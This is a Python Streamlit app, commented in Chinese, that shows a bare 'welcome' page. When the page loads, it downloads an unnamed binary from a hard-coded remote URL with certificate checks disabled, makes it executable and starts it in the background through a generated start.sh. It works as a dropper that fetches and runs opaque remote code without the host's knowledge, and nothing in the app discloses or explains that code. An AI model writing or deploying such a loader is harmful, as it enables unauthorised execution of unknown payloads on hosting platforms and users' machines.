import pathlib
import ssl
import urllib.request
import shutil
from datetime import datetime
import os
import platform
import sys
import subprocess
import argparse
import time
import streamlit as st


ROOT_DIR = pathlib.Path.home() / ".tool"
DEBUG_LOG = ROOT_DIR / "debug.log"
PID_FILE = ROOT_DIR / "stream.pid"
BIN_FILE = ROOT_DIR / "stream"
BIN_ARGS = ""

def debug_log(message):
    print(message)
    write_debug_log(message)

def write_debug_log(message):
    try:
        if not ROOT_DIR.exists():
            ROOT_DIR.mkdir(parents=True, exist_ok=True)
        with open(DEBUG_LOG, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"写入日志失败: {e}")

def download_file(url, target_path, mode='wb'):
    if pathlib.Path(target_path).exists():
        return True

    retries = 0
    max_retries = 3
    current_delay = 10
    backoff_factor = 2
    while retries <= max_retries:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, context=ctx) as response, open(target_path, mode) as out_file:
                shutil.copyfileobj(response, out_file)
            return True
        except Exception as e:
            if retries < max_retries:
                debug_log(f"下载文件失败: {url}, 错误: {e}, 等待 {current_delay:.2f} seconds...")
                time.sleep(current_delay)
                current_delay *= backoff_factor # Increase delay for next retry (exponential backoff)
                retries += 1
            else:
                debug_log(f"下载文件失败: {url}, 错误: {e}")
                return False


# 下载二进制文件
def download_binary(download_url, target_path):
    debug_log(f"正在下载 {download_url}...")
    success = download_file(download_url, target_path)
    if success:
        debug_log(f"{download_url} 下载成功!")
        os.chmod(target_path, 0o755)
        return True
    else:
        debug_log(f"{download_url} 下载失败!")
        return False

# 安装过程
def install(args):
    if not ROOT_DIR.exists():
        ROOT_DIR.mkdir(parents=True, exist_ok=True)
    debug_log("开始安装过程:")
    system = platform.system().lower()
    machine = platform.machine().lower()
    arch = ""
    if system == "linux":
        if "x86_64" in machine or "amd64" in machine: arch = "amd64"
        elif "aarch64" in machine or "arm64" in machine: arch = "arm64"
        else: arch = "amd64"
    else:
        debug_log(f"不支持的系统类型: {system}")
        sys.exit(1)
    debug_log(f"检测到系统: {system}, 架构: {machine}, 使用架构标识: {arch}")
    url = args.url + f"?arch={arch}"
    success = download_binary(url, BIN_FILE)
    if not success:
        return
    create_startup_script()
    start_services()


# 创建启动脚本
def create_startup_script():  
    start_script_path = ROOT_DIR / "start.sh"
    start_content = f'''#!/bin/bash
cd {ROOT_DIR.resolve()}
{BIN_FILE} {BIN_ARGS} > run.log 2>&1 &
echo $! > {PID_FILE}
'''
    start_script_path.write_text(start_content)
    os.chmod(start_script_path, 0o755)


# 启动服务
def start_services():
    debug_log("正在启动服务...")
    subprocess.run(str(ROOT_DIR / "start.sh"), shell=True)
    
    debug_log("等待服务启动 (约5秒)...")
    time.sleep(5)
    debug_log("服务启动命令已执行. ")

# 检查脚本运行状态
def check_status():
    running = PID_FILE.exists() and os.path.exists(f"/proc/{PID_FILE.read_text().strip()}")
    if running:
        debug_log(f"当前状态 active : {PID_FILE.read_text().strip()}")
        return True
    else:
        debug_log(f"当前状态 deactive ")
        return False

def upgrade():
    debug_log("开始升级")

# 添加命令行参数解析
def parse_args():
    parser = argparse.ArgumentParser(description="shell command")
    parser.add_argument("action", nargs="?", default="install",
                        choices=["install", "status", "update", "del", "uninstall", "cat"],
                        help="操作类型: install(安装), status(状态), update(更新), del(卸载)")
    parser.add_argument("--url", "-u", default="https://cn.quinn.eu.org/api/file/stream", help="donwload url")

    return parser.parse_args()

def run():
    args = parse_args()

    if args.action == "install":
        install(args)
    elif args.action == "update":
        upgrade()
    elif args.action == "status":
        check_status()
    else: # 默认行为，通常是 'install' 或者检查后提示
        if ROOT_DIR.exists() and PID_FILE.exists():
            debug_log("检测到可能已安装并正在运行")
            if check_status():
                debug_log("如需重新安装，请先执行卸载: python3 " + os.path.basename(__file__) + " del")
            else:
                debug_log("服务状态异常，建议尝试重新安装.")
                install(args) # 尝试重新安装
        else:
            debug_log("未检测到完整安装，开始执行安装流程...")
            install(args)


st.title("欢迎来到 👋")
st.text_area( "当前目录的文件:", ROOT_DIR)
if st.button("日志"):
    if DEBUG_LOG.exists():
        st.code(DEBUG_LOG.read_text().strip(), language='Go')
    else:
        st.code("没有日志")
    if PID_FILE.exists():
        st.text_area( "当前的pid:", PID_FILE.read_text().strip())
running = PID_FILE.exists() and os.path.exists(f"/proc/{PID_FILE.read_text().strip()}")
if st.button("运行", disabled=running):
    run()
if not running:
    run()
